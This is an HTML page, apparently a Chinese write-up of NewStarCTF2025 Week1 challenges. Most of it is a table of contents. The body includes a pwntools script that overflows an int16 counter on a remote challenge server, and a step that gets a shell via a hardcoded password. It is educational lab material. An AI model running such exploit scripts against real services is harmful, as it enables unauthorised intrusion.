+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#input_function">input_function
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#web">Web
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#multi-headach3">multi-headach3
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#strange_login">strange_login
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%bb%91%e5%ae%a2%e5%b0%8fw%e7%9a%84%e6%95%85%e4%ba%8b1">黑客小W的故事（1）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%ae%87%e5%ae%99%e7%9a%84%e4%b8%ad%e5%bf%83%e6%98%afphp">宇宙的中心是php
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%88%91%e7%9c%9f%e5%be%97%e6%8e%a7%e5%88%b6%e4%bd%a0%e4%ba%86">我真得控制你了
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%88%ab%e7%ac%91%e4%bd%a0%e4%b9%9f%e8%bf%87%e4%b8%8d%e4%ba%86%e7%ac%ac%e4%ba%8c%e5%85%b3">别笑，你也过不了第二关
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#misc">Misc
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#sign-in">Sign in
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#misc%e5%9f%8e%e9%82%a6-%e5%8e%8b%e7%bc%a9%e6%9c%af">MISC城邦-压缩术
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#ez_fence">EZ_fence
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#osint-%e5%a4%a9%e7%a9%babelong">OSINT-天空belong
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%88%91%e4%b8%8d%e8%a6%81%e9%9d%a9%e5%91%bd%e5%a4%b1%e8%b4%a5">我不要革命失败
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%89%8d%e6%9c%89%e6%96%87%e5%ad%97%e6%89%80%e4%bb%a5%e6%90%9c%e7%b4%a2%e5%be%88%e6%9c%89%e7%94%a8">前有文字，所以搜索很有用
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#crypto">Crypto
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#sagemath%e4%bd%bf%e7%94%a8%e6%8c%87%e5%93%aa">Sagemath使用指哪？
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%88%9d%e8%af%86rsa">初识RSA
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%94%af%e4%b8%80%e8%a1%a8%e7%a4%ba">唯一表示
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%b0%8f%e8%b7%b3%e8%9b%99">小跳蛙
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e9%9a%8f%e6%9c%ba%e6%95%b0%e4%b9%8b%e6%97%851">随机数之旅1
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#reverse">Reverse
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#strange-base">Strange Base
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#x0r">X0r
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#puzzle">Puzzle
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#ezmydroid">EzMyDroid
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#plzdebugme">plzdebugme
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%8c%91%e6%88%98">挑战
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#cry%e9%9a%8f%e6%9c%ba%e6%95%b0%e4%b9%8b%e6%97%8513">[Cry]随机数之旅1.3
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#cry%e9%9a%8f%e6%9c%ba%e6%95%b0%e4%b9%8b%e6%97%8519">[Cry]随机数之旅1.9
+        </a>
+      </li></ul><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#web-1">Web
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#dd%e5%8a%a0%e9%80%9f%e5%99%a8">DD加速器
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e7%9c%9f%e7%9a%84%e6%98%af%e7%ad%be%e5%88%b0%e8%af%b6">真的是签到诶
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%90%9e%e7%82%b9%e5%93%a6%e6%b6%a6%e5%90%89%e5%90%83%e5%90%83%e6%a9%98">搞点哦润吉吃吃橘
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e7%99%bd%e5%b8%bd%e5%b0%8fk%e7%9a%84%e6%95%85%e4%ba%8b1">白帽小K的故事（1）
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e5%b0%8fe%e7%9a%84%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f">小E的管理系统
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#misc-1">Misc
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e7%be%8e%e5%a6%99%e7%9a%84%e9%9f%b3%e4%b9%90">美妙的音乐
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#osint-%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5">OSINT-威胁情报
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90-%e4%b8%8d%e6%95%ac%e8%80%85%e7%9a%84%e9%97%af%e5%85%a5">日志分析-不敬者的闯入
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:break-words" href="#%e6%98%9f%e6%9c%9f%e5%9b%9b%e7%9a%84%e7%8b%82%e6%83%b3">星期四的狂想
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button aria-hidden="true" id="backToTop" onClick="scrollUp();" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>返回顶部</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main class="hx:w-full hx:min-w-0 hx:max-w-6xl hx:px-6 hx:pt-4 hx:md:px-12">
+        <div class="hx:mt-1.5 hx:flex hx:items-center hx:gap-1 hx:overflow-hidden hx:text-sm hx:text-gray-500 hx:dark:text-gray-400 hx:contrast-more:text-current">
+        <div class="hx:whitespace-nowrap hx:transition-colors hx:min-w-[24px] hx:overflow-hidden hx:text-ellipsis hx:hover:text-gray-900 hx:dark:hover:text-gray-100">
+          <a href="/wp/">Wp</a>
+        </div><svg class="hx:w-3.5 hx:shrink-0 hx:rtl:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg><div class="hx:whitespace-nowrap hx:transition-colors hx:font-medium hx:text-gray-700 hx:contrast-more:font-bold hx:contrast-more:text-current hx:dark:text-gray-100 hx:contrast-more:dark:text-current">NewStarCTF2025 WP</div>
+  </div>
+
+        <h1 class="hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">NewStarCTF2025 WP</h1>
+        <div class="hx:mt-4 hx:mb-16 hx:text-gray-500 hx:dark:text-gray-400 hx:text-sm hx:flex hx:items-center hx:flex-wrap hx:gap-y-2"><span class="hx:mr-1">January 26, 2026</span></div>
+        <div class="content">
+          <h1>Week1</h1><h2>Pwn<span class="hx:absolute hx:-mt-20" id="pwn"></span>
+    <a href="#pwn" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>GNU Debugger<span class="hx:absolute hx:-mt-20" id="gnu-debugger"></span>
+    <a href="#gnu-debugger" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>将下载的附件用gdb打开</p>
+<p>
+    <img src="../imgs/image-20250930142638665.png" alt="image-20250930142638665"  loading="lazy" /></p>
+<p>按照引导继续操作</p>
+<p>
+    <img src="../imgs/image-20250930142744261.png" alt="image-20250930142744261"  loading="lazy" /></p>
+<p>第一关</p>
+<p>
+    <img src="../imgs/image-20250930143000631.png" alt="image-20250930143000631"  loading="lazy" /></p>
+<p>第二关</p>
+<p>
+    <img src="../imgs/image-20250930143339823.png" alt="image-20250930143339823"  loading="lazy" /></p>
+<p>第三关</p>
+<p>
+    <img src="../imgs/image-20250930143752740.png" alt="image-20250930143752740"  loading="lazy" /></p>
+<p>第四关</p>
+<p>
+    <img src="../imgs/image-20250930143914533.png" alt="image-20250930143914533"  loading="lazy" /></p>
+<p>拿到flag  flag{17ea4a95-62c3-4bef-9469-c6910d8b3aa1}</p>
+<h3>INTbug<span class="hx:absolute hx:-mt-20" id="intbug"></span>
+    <a href="#intbug" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>IDA打开分析代码，发现每次用户输入&gt;0 <code>v1</code>自增，但是自增需要小于0，v1是int16类型的变量，其取值范围是从 -32768 到 32767。当 <code>v1</code> 增加到超过 32767 时，会发生溢出，数值会回绕到 -32768</p>
+<p>
+    <img src="../imgs/image-20250929132930656.png" alt="image-20250929132930656"  loading="lazy" /></p>
+<p>为了使 <code>v1</code> 发生溢出，我们需要计算从0增加到32767所需的次数，然后再加上1次，使其回绕到 -32768</p>
+<p>那么可以写exp</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;47.94.87.199&#39;</span>, <span style="color:#ae81ff">20493</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Initial output:&#34;</span>, p<span style="color:#f92672">.</span>recvrepeat(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Response after one input:&#34;</span>, p<span style="color:#f92672">.</span>recvrepeat(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>total_inputs <span style="color:#f92672">=</span> <span style="color:#ae81ff">32768</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, total_inputs, chunk_size):
+</span></span><span style="display:flex;"><span>    chunk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> min(chunk_size, total_inputs <span style="color:#f92672">-</span> i)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(chunk)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>clean(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;You got it!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, flag)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Connection closed unexpectedly.&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">TimeoutError</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Timeout waiting for &#39;You got it!&#39;.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>close()</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20250929140928578.png" alt="image-20250929140928578"  loading="lazy" /></p>
+<p>拿到flag</p>
+<h3>pwn&rsquo;s door<span class="hx:absolute hx:-mt-20" id="pwns-door"></span>
+    <a href="#pwns-door" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>使用IDA打开分析代码
+    <img src="../imgs/image-20250929122755761.png" alt="image-20250929122755761"  loading="lazy" /></p>
+<p>分析逻辑，发现需要输入passwd 703829</p>
+<p>nc 连接输入密码后得到sh，可以执行命令</p>
+<p>cat flag 得到flag</p>
+<p>
+    <img src="../imgs/image-20250929122811506.png" alt="image-20250929122811506"  loading="lazy" /></p>
+<h3>overflow<span class="hx:absolute hx:-mt-20" id="overflow"></span>
+    <a href="#overflow" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>pwn的常规流程</p>
+<p>
+    <img src="../imgs/image-20251001173108463.png" alt="image-20251001173108463"  loading="lazy" /></p>
+<p>用IDA分析程序</p>
+<p>
+    <img src="../imgs/image-20251001172424385.png" alt="image-20251001172424385"  loading="lazy" /></p>
